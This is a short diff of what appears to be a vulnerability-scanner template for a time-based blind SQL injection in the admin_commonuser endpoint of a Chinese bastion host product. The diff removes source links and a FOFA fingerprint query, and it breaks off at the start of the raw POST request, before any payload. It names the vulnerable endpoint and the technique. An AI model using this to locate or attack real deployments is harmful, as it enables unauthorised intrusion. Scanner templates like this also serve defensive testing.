@@ -3,14 +3,8 @@ info:
   name: 中远麒麟堡垒机admin_commonuserSQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/eb1067b93f97a9b84c0e738d12c08d99
-
-    [!] 推断说明: 时间盲注: 命中条件为推断(duration>=5s), 请按实际 payload 延时核验。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  description: '[!] 推断说明: 时间盲注: 命中条件为推断(duration>=5s), 请按实际 payload 延时核验。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
   tags: sqli,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: eb1067b93f97a9b84c0e738d12c08d99
-    fofa: + fofa`cert.subject="Baolei"`
 http:
 - raw:
   - 'POST /admin.php?controller=admin_commonuser HTTP/1.1
